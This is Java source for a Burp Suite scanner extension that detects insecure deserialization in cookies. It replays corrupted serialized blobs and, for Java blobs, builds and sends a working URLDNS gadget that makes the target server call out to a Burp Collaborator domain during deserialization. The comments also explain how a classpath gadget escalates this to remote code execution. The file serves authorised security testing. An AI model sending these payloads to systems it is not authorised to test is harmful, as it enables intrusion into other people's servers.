package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.Cookie;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.ui.ScanLog;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.net.URLStreamHandler;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.regex.Pattern;

/**
 * Insecure-deserialization probe — generic, no app-specific paths or payloads. Two stages:
 *
 * <p>(1) DETECT: read the site map for cookie/header values that decode to a KNOWN serialized-object blob
 * (Java {@code 0xACED0005} / base64 {@code rO0AB…}, .NET BinaryFormatter, Python pickle, PHP {@code serialize()}).
 *
 * <p>(2) VALIDATE (black-box, deterministic, no gadget): replay a request with that cookie once UNCHANGED and once
 * with its serialized stream CORRUPTED (only the object bytes flipped — length/format kept). If the app returns a
 * normal status for the valid blob but a SERVER ERROR (5xx) for the corrupted one, the server is calling
 * {@code readObject()} on attacker-controlled data — the CWE-502 sink — and the delta proves it over the network
 * alone (no container access, no ysoserial). The corrupted request/response is attached as the finding's evidence.
 * A finding is emitted ONLY when this dynamic delta is observed (near-zero FP); the passive magic-byte match alone
 * is not reported, so we never claim a vuln we couldn't trigger.
 */
public final class InsecureDeserializationProbe {

    private final MontoyaApi api;
    private final ScanLog scanLog;

    private static final Pattern SKIP = Pattern.compile(
            "(?i).*/(socket\\.io|engine\\.io|sockjs-node)(\\b.*)?$"
            + "|.*/(manifest\\.json|asset-manifest\\.json|service-worker\\.js|robots\\.txt|browserconfig\\.xml|favicon\\.ico)$"
            + "|.*/static/.*"
            + "|.*\\.(css|js|mjs|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|mp4|webp|pdf|webmanifest)(\\?.*)?$");
    private static final Pattern B64ISH = Pattern.compile("[A-Za-z0-9+/_=-]{16,}");
    private static final Pattern PHP_SER = Pattern.compile("(?s)^(O:\\d+:\"[^\"]+\":\\d+:\\{.*|a:\\d+:\\{.*)");

    public InsecureDeserializationProbe(MontoyaApi api, ScanLog scanLog) {
        this.api = api;
        this.scanLog = scanLog;
    }

    /** @param candidates discovered GET endpoints to try as the deserialization sink (e.g. a public REST read). */
    public int probe(String host, List<HttpRequest> candidates) {
        int hits = 0;
        try {
            // (1) DETECT serialized cookies the app hands the client (name -> {value, format}).
            Map<String, String[]> cookies = new LinkedHashMap<>();   // name -> {value, fmt}
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                String url = rr.request() != null ? rr.request().url() : null;
                if (url == null || !host.equalsIgnoreCase(hostOf(url)) || SKIP.matcher(url).matches()) continue;
                if (rr.response() != null) {
                    try { for (Cookie c : rr.response().cookies()) noteSerialized(cookies, c.name(), c.value()); }
                    catch (Throwable ignore) { }
                }
                try {
                    String hdr = rr.request().headerValue("Cookie");
                    if (hdr != null) for (String part : hdr.split(";")) {
                        int eq = part.indexOf('=');
                        if (eq > 0) noteSerialized(cookies, part.substring(0, eq).trim(), part.substring(eq + 1).trim());
                    }
                } catch (Throwable ignore) { }
            }
            if (cookies.isEmpty()) return 0;

            // (2) VALIDATE each serialized cookie by the corrupt-stream delta against candidate sink endpoints.
            List<String> sinks = sinkUrls(host, candidates);
            for (Map.Entry<String, String[]> e : cookies.entrySet()) {
                String name = e.getKey(), value = e.getValue()[0], fmt = e.getValue()[1];
                String corrupted = corrupt(value);
                if (corrupted == null || corrupted.equals(value)) continue;
                for (String url : sinks) {
                    HttpRequestResponse ok = getWithCookie(url, name, value);
                    int okSt = status(ok);
                    if (okSt < 200 || okSt >= 500) continue;                 // need a clean, non-error baseline
                    HttpRequestResponse bad = getWithCookie(url, name, corrupted);
                    int badSt = status(bad);
                    if (badSt < 500) continue;                               // corrupting the object changed nothing here
                    // CONFIRMED deserialization: same request, only the serialized bytes differ, yet valid<500 and corrupt=5xx.
                    // Now ESCALATE to an out-of-band RCE-class proof: for a Java blob, send a URLDNS gadget (generic —
                    // no classpath gadget lib needed) and see if the server resolves our unique Collaborator domain
                    // DURING deserialization. A callback proves the sink processes our attacker object graph + does
                    // network I/O from inside readObject() — RCE with a classpath gadget. Best-effort; the delta above
                    // stands on its own if Collaborator is unavailable or the target has no egress.
                    Oob oob = "Java".equals(fmt) ? confirmOob(url, name) : null;
                    if (oob != null && oob.confirmed) {
                        scanLog.found("Insecure deserialization — RCE-class, OOB-confirmed via cookie '" + name + "' (Java)",
                                originOf(url),
                                "PROOF (out-of-band, no container access): a URLDNS serialized object placed in cookie '"
                                + name + "' and sent to " + stripQuery(url) + " made the SERVER resolve our unique domain "
                                + oob.domain + " (" + oob.type + " interaction on Burp Collaborator) DURING deserialization. "
                                + "The server calls readObject() on attacker-controlled data AND performs network I/O from the "
                                + "deserialized object graph — remote-code-execution-class (CWE-502); with a classpath gadget "
                                + "(commons-collections etc.) it is full RCE. Corroborated by the deterministic delta: valid blob "
                                + "→ HTTP " + okSt + ", corrupted stream → HTTP " + badSt + ".",
                                oob.rr != null ? oob.rr : bad);
                    } else {
                        scanLog.found("Insecure deserialization — server deserializes cookie '" + name + "' (" + fmt + ")",
                                originOf(url),
                                "PROOF (black-box, no container access): a request to " + stripQuery(url) + " returns HTTP "
                                + okSt + " with the app's own serialized " + fmt + " cookie '" + name + "', but HTTP " + badSt
                                + " when ONLY that cookie's serialized object bytes are corrupted (same length/format). The "
                                + "server therefore calls ObjectInputStream.readObject() (or the " + fmt + " equivalent) on "
                                + "attacker-controlled data — the classic CWE-502 gadget sink → potential RCE if a gadget "
                                + "(e.g. commons-collections) is on the classpath. Deterministic delta over HTTP alone.",
                                bad);
                    }
                    scanLog.incFinding();
                    hits++;
                    break;   // one confirmation per cookie is enough
                }
            }
        } catch (Throwable t) {
            scanLog.debug("[AI Scanner] insecure-deserialization probe error: " + t);
        }
        return hits;
    }

    private void noteSerialized(Map<String, String[]> out, String name, String value) {
        if (name == null || value == null || out.containsKey(name)) return;
        String fmt = serializedFormat(value);
        if (fmt != null) out.put(name, new String[]{ value, fmt });
    }

    /** Candidate deserialization-sink URLs: discovered GET endpoints first (a public REST read reaches the sink),
     *  then same-site GETs already in the site map. Deduped by path, capped. */
    private List<String> sinkUrls(String host, List<HttpRequest> candidates) {
        LinkedHashSet<String> urls = new LinkedHashSet<>();
        if (candidates != null) for (HttpRequest r : candidates) {
            if (r == null || !"GET".equalsIgnoreCase(r.method())) continue;
            String u = r.url();
            if (u != null && host.equalsIgnoreCase(hostOf(u)) && !SKIP.matcher(u).matches()) urls.add(stripQuery(u));
        }
        try {
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (urls.size() >= 25) break;
                String u = rr.request() != null ? rr.request().url() : null;
                if (u == null || !host.equalsIgnoreCase(hostOf(u)) || SKIP.matcher(u).matches()) continue;
                if (rr.request().method() != null && rr.request().method().equalsIgnoreCase("GET")) urls.add(stripQuery(u));
            }
        } catch (Throwable ignore) { }
        return new ArrayList<>(urls);
    }

    private HttpRequestResponse getWithCookie(String url, String name, String value) {
        try {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET")
                    .withHeader("Cookie", name + "=" + value);
            return api.http().sendRequest(req, RequestOptions.requestOptions());
        } catch (Throwable t) { return null; }
    }

    private static int status(HttpRequestResponse rr) {
        try { return rr != null && rr.response() != null ? rr.response().statusCode() : -1; }
        catch (Throwable t) { return -1; }
    }

    /** Result of the out-of-band RCE-class confirmation. */
    private static final class Oob {
        final boolean confirmed; final String domain, type; final HttpRequestResponse rr;
        Oob(boolean c, String d, String t, HttpRequestResponse rr) { confirmed = c; domain = d; type = t; this.rr = rr; }
    }

    /** Send a URLDNS gadget (bound to a fresh Collaborator domain) in the cookie and poll for the server-side
     *  DNS/HTTP callback. Fresh client → ANY interaction is ours. Best-effort: null if Collaborator/gadget/egress
     *  is unavailable, so the deterministic delta finding still fires. */
    private Oob confirmOob(String url, String cookieName) {
        CollaboratorClient client;
        try { client = api.collaborator().createClient(); }
        catch (Throwable t) { scanLog.debug("[AI Scanner] deser OOB: Collaborator unavailable."); return null; }
        try {
            CollaboratorPayload payload = client.generatePayload();
            String domain = payload.toString();
            byte[] gadget = urldnsGadget(domain);
            if (gadget == null) { scanLog.debug("[AI Scanner] deser OOB: URLDNS build failed (needs --add-opens java.base/java.net)."); return null; }
            HttpRequestResponse rr = getWithCookie(url, cookieName, Base64.getEncoder().encodeToString(gadget));
            scanLog.log("[AI Scanner] deser OOB: sent URLDNS gadget (" + domain + ") — polling Collaborator…");
            for (int round = 0; round < 6; round++) {
                Thread.sleep(2500);
                List<Interaction> its = client.getAllInteractions();
                if (!its.isEmpty()) return new Oob(true, domain, its.get(0).type().toString(), rr);
            }
            return new Oob(false, domain, null, rr);
        } catch (InterruptedException ie) { Thread.currentThread().interrupt(); return null; }
        catch (Throwable t) { scanLog.debug("[AI Scanner] deser OOB error: " + t); return null; }
    }

    /** Build a URLDNS serialized gadget: a HashMap keyed by a URL whose cached hashCode is reset to -1, so on the
     *  TARGET's readObject the HashMap recomputes the URL hash → java.net.URL.hashCode → getHostAddress → a DNS
     *  lookup of {@code domain}. Generic (no gadget library); a benign OOB probe (DNS only, no command). Requires
     *  reflective access to java.net.URL.hashCode (launcher adds --add-opens java.base/java.net=ALL-UNNAMED). */
    static byte[] urldnsGadget(String domain) {
        try {
            URLStreamHandler silent = new URLStreamHandler() {           // no DNS while we build it in THIS jvm
                protected URLConnection openConnection(URL u) { return null; }
                protected synchronized InetAddress getHostAddress(URL u) { return null; }
            };
            URL u = new URL("http", domain, 80, "/", silent);
            HashMap<URL, String> m = new HashMap<>();
            m.put(u, "x");                                              // computes hashCode via silent handler (no DNS)
            Field f = URL.class.getDeclaredField("hashCode");
            f.setAccessible(true);
            f.setInt(u, -1);                                            // reset → target recomputes (real DNS) on deserialize
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) { oos.writeObject(m); }
            return bos.toByteArray();
        } catch (Throwable t) { return null; }
    }

    /** Corrupt a serialized blob's OBJECT bytes while keeping its outer format (so the server still parses it AS a
     *  serialized object and fails INSIDE deserialization). base64 → flip a mid-stream byte window; PHP text →
     *  break the class-length so unserialize() errors. Returns null if it can't produce a distinct value. */
    static String corrupt(String value) {
        if (value == null) return null;
        String v = value.trim();
        byte[] dec = tryBase64(v);
        if (dec != null && dec.length > 12) {
            int from = Math.min(10, dec.length - 1), to = Math.min(dec.length, from + 40);
            for (int i = from; i < to; i++) dec[i] ^= 0x5A;   // keep the magic header, corrupt the class/data region
            boolean urlSafe = v.indexOf('-') >= 0 || v.indexOf('_') >= 0;
            String b = Base64.getEncoder().encodeToString(dec);
            if (urlSafe) b = b.replace('+', '-').replace('/', '_');
            return b;
        }
        if (PHP_SER.matcher(v).matches()) {
            // O:<len>:"Class":… → change <len> so the declared class length no longer matches → unserialize error
            return v.replaceFirst("^O:(\\d+):", "O:999:");
        }
        return null;
    }

    /** The serialization-format label if {@code value} carries a serialized-object blob, else null. */
    static String serializedFormat(String value) {
        if (value == null) return null;
        String v = value.trim();
        if (v.length() < 8) return null;
        if (v.startsWith("rO0AB") || v.startsWith("rO0ab")) return "Java";
        if (v.startsWith("AAEAAAD/////")) return ".NET BinaryFormatter";
        byte[] dec = tryBase64(v);
        if (dec != null && dec.length >= 2) {
            if ((dec[0] & 0xFF) == 0xAC && (dec[1] & 0xFF) == 0xED) return "Java";
            if ((dec[0] & 0xFF) == 0x80 && (dec[1] & 0xFF) <= 0x05) return "Python pickle";
            if (dec.length >= 5 && dec[0] == 0x00 && dec[1] == 0x01 && dec[2] == 0x00 && dec[3] == 0x00 && dec[4] == 0x00)
                return ".NET BinaryFormatter";
        }
        if (PHP_SER.matcher(v).matches()) return "PHP";
        return null;
    }

    private static byte[] tryBase64(String v) {
        String s = v;
        try { if (s.indexOf('%') >= 0) s = URLDecoder.decode(s, StandardCharsets.UTF_8); } catch (Exception ignore) { }
        if (!B64ISH.matcher(s).matches()) return null;
        String b = s.replace('-', '+').replace('_', '/');
        while (b.length() % 4 != 0) b += "=";
        try { return Base64.getDecoder().decode(b); } catch (Throwable t) { return null; }
    }

    private static String hostOf(String url) { try { return URI.create(url).getHost(); } catch (Exception e) { return ""; } }
    private static String stripQuery(String url) { int q = url.indexOf('?'); return q < 0 ? url : url.substring(0, q); }
    private static String originOf(String url) {
        try { URI u = URI.create(url); return u.getScheme() + "://" + u.getAuthority() + "/"; } catch (Exception e) { return url; }
    }
}
